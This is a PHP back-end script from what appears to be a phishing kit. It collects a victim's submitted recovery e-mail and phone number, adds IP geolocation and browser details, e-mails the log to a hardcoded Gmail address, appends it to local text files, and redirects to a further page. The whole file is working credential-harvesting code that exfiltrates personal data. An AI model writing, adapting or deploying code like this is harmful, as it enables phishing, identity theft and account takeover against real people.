<?php

$login = $_REQUEST['login'];

require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "=============+ LOGS +=============\n";
$message .= "Recovery E-mail: ".$_POST['recovery']."\n";
$message .= "Phone Number: ".$_POST['phone']."\n";
$message .= "============= [ip] =============\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";


$domain = 'EMS REC';
$subj = "$geoplugin->ip | $geoplugin->countryCode | $geoplugin->countryName";
$from = "From: $domain<west>\n";
mail("millergreg.greg435@gmail.com",$subj,$message,$from,$domain);

$fp = fopen("lek.txt","a");
fputs($fp,$message);
fclose($fp);


file_put_contents('../Maerskswx11.txt', $message, FILE_APPEND);

header("Location: go.php");

?>